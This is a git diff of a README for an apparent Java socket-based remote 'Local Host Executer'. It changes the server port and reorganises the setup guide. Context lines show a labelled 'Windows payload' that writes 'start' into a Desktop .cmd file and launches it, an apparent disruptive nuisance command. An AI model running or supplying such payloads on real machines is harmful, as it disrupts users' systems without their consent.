@@ -15,8 +15,9 @@ Before running `installer.sh` you need to open the terminal as root in the insta
 
 After running it you can select the "system" that you're using.
 
+## Guide
 ### Server
-The server is built in java with a socket connection, it will use port 5000 and its own IPv4 as its IP address (Ex. 192.168.1.255).
+The server is built in java with a socket connection, it will use port 65000 and its own IPv4 as its IP address (Ex. 192.168.1.255).
 
 ### Client
 The client is built in java with a socket connection like the server.
@@ -37,13 +38,6 @@ Windows payload :
 - `echo start >> C:\users\%username%\Desktop\file.cmd`  
 
 - `start C:\users\%username%\Desktop\file.cmd`
-
-## Guide
-First of all, start the server (server.jar or server.java)
-
-After starting the server, start the client which will connect automatically
-
-Now you have a Local Host Executer made by Fedi6431
 
 ### FILE Path
 
